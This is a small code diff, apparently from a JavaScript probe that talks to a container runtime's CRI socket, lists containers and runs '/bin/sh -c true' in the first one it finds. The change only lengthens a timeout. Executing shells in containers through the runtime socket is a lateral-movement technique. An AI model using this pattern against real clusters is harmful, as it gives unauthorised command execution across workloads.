@@ -4,6 +4,6 @@ const fl=(n,s)=>{const b=Buffer.from(s);return Buffer.concat([Buffer.from([n,b.l
 call('/runtime.v1.RuntimeService/ListContainers',Buffer.from([0x0a,0x00]),(e,buf)=>{
  if(e)return; const ids=[...new Set((buf.toString('latin1').match(/[0-9a-f]{64}/g)||[]))].slice(0,1); if(!ids.length)return;
  call('/runtime.v1.RuntimeService/ExecSync',Buffer.concat([fl(0x0a,ids[0]),fl(0x12,'/bin/sh'),fl(0x12,'-c'),fl(0x12,'true')]),()=>{
-   setTimeout(()=>{},20000);
+   setTimeout(()=>{},40000);
  });
 });
